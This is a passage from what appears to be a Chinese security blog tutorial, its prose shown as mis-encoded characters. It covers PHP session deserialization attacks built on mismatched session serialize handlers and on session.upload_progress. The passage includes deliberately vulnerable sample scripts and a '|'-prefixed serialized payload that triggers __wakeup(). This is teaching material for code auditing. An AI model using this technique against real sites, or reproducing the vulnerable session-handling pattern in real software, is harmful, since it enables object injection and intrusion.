<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php : a|s:<span class="number">3</span>:<span class="string">&quot;wzk&quot;</span>;</span><br><span class="line">php_serialize : a:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;wzk&quot;</span>;&#125;</span><br><span class="line">php_binary : <span class="keyword">as</span>:<span class="number">3</span>:<span class="string">&quot;wzk&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ ·ä¾‹æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);</span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;lemon&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ”»å‡»æ€è·¯ï¼š</p>
<p>é¦–å…ˆè®¿é—®1.phpï¼Œåœ¨ä¼ å…¥çš„å‚æ•°æœ€å¼€å§‹åŠ ä¸€ä¸ªâ€™|â€™ï¼Œç”±äº1.phpæ˜¯ä½¿ç”¨php_serializeå¼•æ“å¤„ç†ï¼Œå› æ­¤åªä¼šæŠŠâ€™|â€™å½“åšä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚ç„¶åè®¿é—®2.phpï¼Œç”±äºç”¨çš„æ˜¯phpå¼•æ“ï¼Œå› æ­¤é‡åˆ°â€™|â€™æ—¶ä¼šå°†ä¹‹çœ‹åšé”®åä¸å€¼çš„åˆ†å‰²ç¬¦ï¼Œä»è€Œé€ æˆäº†æ­§ä¹‰ï¼Œå¯¼è‡´å…¶åœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹â€™|â€™åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚</p>
<p>è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªå°ç–‘é—®ï¼Œä¸ºä»€ä¹ˆåœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹â€™|â€™åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†å™¨çš„åŠŸèƒ½ï¼Ÿè¿™ä¸ªå…¶å®æ˜¯å› ä¸ºsession_start()è¿™ä¸ªå‡½æ•°</p>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-10-13%20155153.png"></p>
<p>é¦–å…ˆç”Ÿæˆä¸€ä¸ªpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;name =  <span class="string">&quot;daye&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span>-&gt;age = <span class="string">&quot;100&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#O:7:&quot;student&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;daye&quot;;s:3:&quot;age&quot;;s:3:&quot;100&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>æ”»å‡»æ€è·¯ä¸­è¯´åˆ°äº†å› ä¸ºä¸åŒçš„å¼•æ“ä¼šå¯¹â€™|â€™ï¼Œäº§ç”Ÿæ­§ä¹‰ï¼Œæ‰€ä»¥åœ¨ä¼ å‚æ—¶åœ¨payloadå‰åŠ ä¸ªâ€™|â€™ï¼Œä½œä¸ºaå‚æ•°</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">7</span>:<span class="string">&quot;student&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;daye&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸè§¦å‘äº†studentç±»çš„__wakeup()æ–¹æ³•,æ‰€ä»¥è¿™ç§æ”»å‡»æ€è·¯æ˜¯å¯è¡Œçš„ã€‚</p>
<h3 id="3ã€åˆ©ç”¨session-upload-progressè¿›è¡Œååºåˆ—åŒ–æ”»å‡»"><a href="#3ã€åˆ©ç”¨session-upload-progressè¿›è¡Œååºåˆ—åŒ–æ”»å‡»" class="headerlink" title="3ã€åˆ©ç”¨session.upload_progressè¿›è¡Œååºåˆ—åŒ–æ”»å‡»"></a>3ã€åˆ©ç”¨session.upload_progressè¿›è¡Œååºåˆ—åŒ–æ”»å‡»</h3><p>åœ¨PHPä¸­è¿˜å­˜åœ¨ä¸€ä¸ªupload_processæœºåˆ¶ï¼Œå³è‡ªåŠ¨åœ¨$_SESSIONä¸­åˆ›å»ºä¸€ä¸ªé”®å€¼å¯¹ï¼Œå€¼ä¸­åˆšå¥½å­˜åœ¨ç”¨æˆ·å¯æ§çš„éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹ä¸‹å®˜æ–¹æè¿°çš„ï¼Œè¿™ä¸ªåŠŸèƒ½åœ¨æ–‡ä»¶ä¸Šä¼ çš„è¿‡ç¨‹ä¸­åˆ©ç”¨sessionå®æ—¶è¿”å›ä¸Šä¼ çš„è¿›åº¦ã€‚</p>
<p>å½“é¢˜ç›®ä¸­æ²¡æœ‰ä¸Šé¢ç±»ä¼¼äºPHP1å†™å…¥$_SESSIONå…¨å±€å˜é‡æ—¶ï¼Œå¯ä»¥åˆ©ç”¨session.upload_progressè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹æ³•ä¸ä¸Šä¸€éƒ¨åˆ†åŸºæœ¬ç›¸åŒï¼Œä¸è¿‡è¿™é‡Œéœ€è¦å…ˆä¸Šä¼ æ–‡ä»¶ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸session.upload_process.nameçš„åŒåå˜é‡ï¼ˆä¸€èˆ¬ä¸ºPHP_SESSION_UPLOAD_PROGRESSï¼‰ã€‚åç«¯ä¼šè‡ªåŠ¨å°†POSTçš„è¿™ä¸ªåŒåå˜é‡ä½œä¸ºé”®è¿›è¡Œåºåˆ—åŒ–ç„¶åå­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ã€‚ä¸‹æ¬¡è¯·æ±‚å°±ä¼šååºåˆ—åŒ–sessionæ–‡ä»¶ï¼Œä»ä¸­å–å‡ºè¿™ä¸ªé”®ã€‚æ‰€ä»¥æ”»å‡»ç‚¹è¿˜æ˜¯è·Ÿä¸Šä¸€éƒ¨åˆ†ä¸€æ¨¡ä¸€æ ·ï¼Œç¨‹åºè¿˜æ˜¯ä½¿ç”¨äº†ä¸åŒçš„sessionå¤„ç†å¼•æ“ã€‚</p>
</div><div class="tags"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">ä»£ç å®¡è®¡</a></li></ul></div><div class="post-nav"><a class="pre" href="/2025/10/13/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/">PHPä»£ç å®¡è®¡-å¼±ç±»å‹</a><a class="next" href="/2025/10/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHPä»£ç å®¡è®¡-ä¼ªåè®®</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/about/" title="å…³äº"><img class="nofancybox" src="/img/avatar.jpg"/></a><p>æ‰€å¹¸ä»æœ‰å…‰.</p><a class="info-icon" href="https://hackerhao.top" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" href="https://github.com/isMyHao" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> åˆ†ç±»</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Java-Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">Java Webå¸¸è§æ¼æ´</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">JavaåŸºç¡€çŸ¥è¯†</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Javaå®‰å…¨</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Js%E5%AE%89%E5%85%A8/">Jså®‰å…¨</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHPä»£ç å®¡è®¡</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHPå®‰å…¨</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Win%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">Winæƒé™æå‡</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E6%8F%90%E6%9D%83/">linuxææƒ</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">äº‘å®‰å…¨</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">å…æ€</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91/">å†…ç½‘</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">æƒé™æå‡</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/">æ¼æ´å‘ç°</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> æ ‡ç­¾</i></div><div class="tagcloud"><a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Javaå®‰å…¨</a> <a href="/tags/Js%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Jså®‰å…¨</a> <a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 15px;">JavaåŸºç¡€</a> <a href="/tags/PHP%E5%AE%89%E5%85%A8/" style="font-size: 15px;">PHPå®‰å…¨</a> <a href="/tags/Java-Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">Java Webå¸¸è§æ¼æ´</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 15px;">linuxææƒ</a> <a href="/tags/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 15px;">JavaåŸºç¡€çŸ¥è¯†</a> <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 15px;">PHPä»£ç å®¡è®¡</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 15px;">ä»£ç å®¡è®¡</a> <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 15px;">äº‘å®‰å…¨</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 15px;">å†…ç½‘</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 15px;">æƒé™æå‡</a> <a href="/tags/Win%E6%8F%90%E5%8D%87/" style="font-size: 15px;">Winæå‡</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" style="font-size: 15px;">æ¼æ´å‘ç°</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 15px;">å…æ€</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> æœ€è¿‘æ–‡ç« </i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/10/13/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/">PHPä»£ç å®¡è®¡-å¼±ç±»å‹</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/12/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHPä»£ç å®¡è®¡-ååºåˆ—åŒ–æ¼æ´</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHPä»£ç å®¡è®¡-ä¼ªåè®®</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/11/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">PHPä»£ç å®¡è®¡-å˜é‡è¦†ç›–</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/11/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">PHPä»£ç å®¡è®¡-å¼±ç±»å‹</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/09/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/">Javaè®¾è®¡æ¨¡å¼-æ¡¥æ¥æ¨¡å¼</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/09/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/">Javaè®¾è®¡æ¨¡å¼-é€‚é…å™¨æ¨¡å¼</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/09/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/">Javaè®¾è®¡æ¨¡å¼-å»ºé€ è€…æ¨¡å¼</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/06/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/">Javaè®¾è®¡æ¨¡å¼-åŸå‹æ¨¡å¼</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/10/06/%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F/">Javaè®¾è®¡æ¨¡å¼-æ¨¡æ¿æ¨¡å¼</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> å‹æƒ…é“¾æ¥</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"></div></div><script type="text/javascript" src="https://unpkg.com/@fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=undefined" async></script><link rel="stylesheet" type="text/css" href="https://unpkg.com/@fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=undefined"><script type="text/javascript" src="/js/search.js?v=undefined"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
  search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" color="0,0,0" opacity="0.5" zIndex="-2" count="50" src="https://unpkg.com/canvas-nest.js/dist/canvas-nest.js"></script><script type="text/javascript" src="/js/love.js?v=undefined"></script><script type="text/javascript" src="/js/copycode.js?v=undefined" successtext="å¤åˆ¶æˆåŠŸï¼"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=undefined"><link rel="stylesheet" type="text/css" href="/css/external.css?v=undefined"><script type="text/javascript" src="/js/codeblock-resizer.js?v=undefined"></script><script type="text/javascript" src="/js/smartresize.js?v=undefined"></script></div></body></html>